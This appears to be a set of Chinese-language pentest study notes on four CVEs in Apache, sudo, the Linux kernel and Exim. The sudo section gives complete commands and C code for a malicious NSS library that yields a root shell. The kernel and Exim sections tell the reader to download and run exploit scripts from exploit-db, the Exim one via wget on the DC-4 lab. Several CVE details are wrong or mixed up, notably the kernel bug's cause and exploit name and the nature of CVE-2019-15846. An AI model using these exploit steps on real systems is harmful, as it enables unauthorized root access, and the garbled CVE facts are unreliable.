## ==CVE-2021-41773==

 是一个高危的路径遍历和文件泄露漏洞，影响 **Apache HTTP Server 2.4.49 版本**。

------



### 漏洞概述



- **漏洞类型：** 路径遍历（CWE-22）和文件泄露。在某些配置下，它还可能导致远程代码执行（RCE）。
- **受影响版本：** Apache HTTP Server 2.4.49。
- **成因：** Apache HTTP Server 2.4.49 中路径规范化过程的缺陷允许攻击者利用路径遍历攻击（例如，使用 `../` 或其 URL 编码的等效形式 `.%2e/`）将 URL 映射到 Alias 类指令配置目录之外的文件。
- **影响：**
  - **文件泄露：** 攻击者可以未经授权地访问服务器上的敏感文件（例如 `/etc/passwd`）。
  - **远程代码执行 (RCE)：** 如果配置目录之外的文件没有受到默认的 "require all denied" 配置保护，并且这些别名路径启用了 CGI 脚本，攻击者就可以在服务器上执行任意代码。
- **利用情况：** 该漏洞在发现后不久就已被积极利用。公开的概念验证（PoC）漏洞利用代码也广泛可用。

------



### 修复与缓解



- **修复版本：** Apache 在 **Apache HTTP Server 2.4.50** 中发布了修复程序。然而，此修复被发现不完整，后来被单独跟踪为另一个漏洞 **CVE-2021-42013**，该漏洞也允许路径遍历和 RCE。针对 CVE-2021-41773 和 CVE-2021-42013 的完整修复已在 **Apache HTTP Server 2.4.51** 中发布。
- **缓解措施：**
  - 主要建议是**将 Apache HTTP Server 更新到 2.4.51 或更高版本**。
  - 如果无法立即更新，请确保所有不打算公开访问的目录都实施了 `Require all denied` 指令。这应应用于所有目录，并且**绝不能**在没有适当限制的情况下应用于根目录。
  - 如果 `mod_cgi` 模块对于业务运营并非必不可少，请禁用它，因为它的启用可能会将漏洞升级为 RCE。
  - 考虑使用 Web 应用程序防火墙（WAF）来帮助检测和阻止利用尝试。





# 🔐 CVE-2025-32463 - Sudo 本地提权漏洞（chroot 绕过）

---

## 🌐 漏洞编号 / CVE ID

- CVE-2025-32463

---

## 🧩 漏洞类型 / Vulnerability Type

- 本地提权 / Local Privilege Escalation (LPE)

---

## 📅 披露时间 / Disclosure Date

- 2025 年 6 月底（在 sudo 1.9.17p1 中修复）

---

## 💥 漏洞影响 / Affected Versions

- Sudo 1.9.14 ~ 1.9.17  
- 含 Ubuntu / Fedora / RHEL / macOS Sequoia（默认环境）

---

## ⚠️ 危害等级 / Severity

- CVSS 评分：9.3（Critical）

---

## 🧪 漏洞简述 / Vulnerability Summary

> 该漏洞利用了 `sudo` 的 `-R` 或 `--chroot` 参数，在切换根目录后解析 `/etc/nsswitch.conf` 时，会加载攻击者控制的 NSS 模块（如 `libnss_xxx.so.2`），最终导致执行恶意共享库中的构造函数，从而实现本地提权。

> This vulnerability leverages the fact that when using `sudo -R` to enter a chroot environment, sudo will parse `nsswitch.conf` from the new root and load potentially malicious `libnss_xxx.so.2` libraries, allowing local attackers to execute arbitrary code as root.

---

## 🧠 漏洞原理 / Root Cause

1. 用户可以使用 `sudo -R /some/dir command` 进入任意 chroot；
2. 在该 chroot 环境下（攻击者可控），可伪造 `/etc/nsswitch.conf` 文件；
3. 指定自定义 NSS 模块名，例如：
   ```text
   passwd: files myhack

1. 系统会尝试加载 `libnss_myhack.so.2`；

2. 恶意共享库中可包含如下构造函数：

   ```apl
   __attribute__((constructor)) void init() {
       setuid(0); setgid(0);
       system("/bin/bash");
   }
   ```

3. 加载时自动执行，获取 root shell。

------

## 🧰 利用条件 / Exploitation Conditions

- 攻击者能写入某个目录并执行 `sudo -R`；
- sudo 未打补丁，仍为受影响版本；
- 系统支持动态加载 NSS 模块。

------

## 🔧 利用步骤 / Exploit Steps

```apl
# Step 1 - 创建伪造目录结构
mkdir -p /tmp/chroot/etc /tmp/chroot/lib

# Step 2 - 编写伪造 nsswitch.conf
echo "passwd: files myhack" > /tmp/chroot/etc/nsswitch.conf

# Step 3 - 编写并编译恶意共享库
cat << EOF > myhack.c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF

gcc -shared -fPIC -o /tmp/chroot/lib/libnss_myhack.so.2 myhack.c

# Step 4 - 触发 sudo chroot 提权
sudo -R /tmp/chroot id   # 或 sudo -R /tmp/chroot /bin/bash
```

执行成功后，即可获取 root shell。

------

## 🔒 修复方案 / Mitigation

- 将 sudo 升级至 **1.9.17p1 或更高版本**；
- 禁止普通用户执行 `sudo -R` 或限制可访问的 chroot 路径；
- 加强 NSS 模块的加载路径校验。

------

## 

# 🛡️ CVE-2017-16995 - Linux Kernel (Ubuntu 16.04) Local Privilege Escalation

## 🧾 漏洞编号
**CVE-2017-16995**

## 📅 披露时间
2017年12月

## 🧠 漏洞类型
本地提权（Local Privilege Escalation）

## 🧬 影响范围
- Linux Kernel 版本：**< 4.14.8**
- Ubuntu 16.04（默认安装）受影响
- 其他使用 `AF_PACKET` 套接字与 `user namespace` 的 Linux 发行版也受影响

---

## 🔍 漏洞描述

该漏洞源于 Linux kernel 中 `net/packet/af_packet.c` 中对 packet socket 的处理不当。攻击者可以通过构造特定的数据包并结合 **user namespaces**，实现对内核内存的任意读写，最终提权至 root。

这允许一个非特权的本地用户利用 socket 配置，**覆盖函数指针**，从而执行任意代码。

---

## 🧪 利用条件

- 本地用户访问权限（已登录系统）
- 系统内核版本小于 4.14.8
- 系统支持 user namespaces（Ubuntu 默认开启）

---

## 🛠️ 利用方式

1. 下载并编译利用代码（doubleput.c）：
   ```bash
   https://www.exploit-db.com/exploits/45010

1. 执行提权：

   ```apl
   ./doubleput
   ```

2. 若成功，60 秒内将获得 root shell。

------

## 💥 利用效果

- 非 root 用户可通过此漏洞获取系统最高权限（root）。
- 可进一步读取敏感文件、修改系统配置、植入后门等。

------

## ✅ 修复方式

- 更新内核至 **4.14.8 或更高版本**

- 临时缓解措施：禁用 **unprivileged user namespaces**

  ```apl
  sudo sysctl -w kernel.unprivileged_userns_clone=0
  ```

# CVE-2019-15846 详解与利用笔记

------

## 📌 漏洞编号

**CVE-2019-15846**

------

## 🧩 漏洞类型

**本地提权漏洞（Local Privilege Escalation）**

------

## 📚 漏洞简介

CVE-2019-15846 是 Exim 邮件传输代理（MTA）在版本 **4.87 至 4.91** 中存在的一个 **本地提权漏洞**，该漏洞允许具有本地 shell 访问权限的攻击者通过创建特制配置文件来执行任意代码，从而提升权限至 root。

------

## 🛠️ 影响版本

- **Exim 4.87 ~ 4.91**

该漏洞在 **4.92** 版本中被修复。

------

## 🧠 漏洞原理

Exim 在处理 **EHLO/HELO** 过程中对外部环境变量处理不当，本地攻击者可利用该缺陷构造恶意的 Exim 配置环境（如自定义配置文件路径、编译脚本），并触发错误逻辑，使得 Exim 执行其构造的任意命令。

攻击步骤大致如下：

1. 攻击者构造恶意配置文件或脚本；
2. 使用特定环境变量欺骗 Exim 加载攻击者控制的配置；
3. 导致 Exim 以 root 权限执行攻击者的命令。

------

## 🧪 利用条件

- 攻击者已获得 **目标主机 shell 权限（低权限用户）**
- 系统中安装了受影响版本的 Exim
- 本地有 Exim 执行权限（通常为 `/usr/sbin/exim` 或 `/usr/sbin/exim4`）

------

## ⚙️ 利用流程（实战演示）

以漏洞靶场 DC-4 为例：

### 🔍 步骤 1：确认版本

```
bash


复制编辑
/usr/sbin/exim4 --version
```

确认版本在 4.87 ~ 4.91 范围内。

------

### 🔧 步骤 2：下载 Exploit 脚本

可使用以下 Exploit-DB 提供的提权脚本：

```
bash


复制编辑
wget https://www.exploit-db.com/raw/46996 -O exim_poc.sh
chmod +x exim_poc.sh
```

------

### 🚀 步骤 3：运行 Exploit

```
bash


复制编辑
./exim_poc.sh
```

脚本会尝试构造利用环境并执行特定命令（如启动 root shell）。如果成功，攻击者将以 root 身份获得交互式 shell。

------

## 🔐 漏洞危害

- 本地用户可获得 **root 权限**
- 可进一步控制整个系统
- 可绕过普通权限隔离机制

------

## 🔧 修复建议

- 升级 Exim 至 **4.92 以上版本**
- 对本地用户 shell 权限进行更严格控制
- 使用 AppArmor、SELinux 等加强进程隔离

------

## 🏁 总结

| 项目         | 内容                                    |
| ------------ | --------------------------------------- |
| 漏洞编号     | CVE-2019-15846                          |
| 类型         | 本地提权漏洞（LPE）                     |
| 影响版本     | Exim 4.87 ~ 4.91                        |
| 漏洞利用条件 | 本地低权限 shell，Exim 安装并可执行     |
| 危害         | 提权为 root，完全控制系统               |
| 修复方法     | 升级至 Exim 4.92+，限制本地用户执行权限 |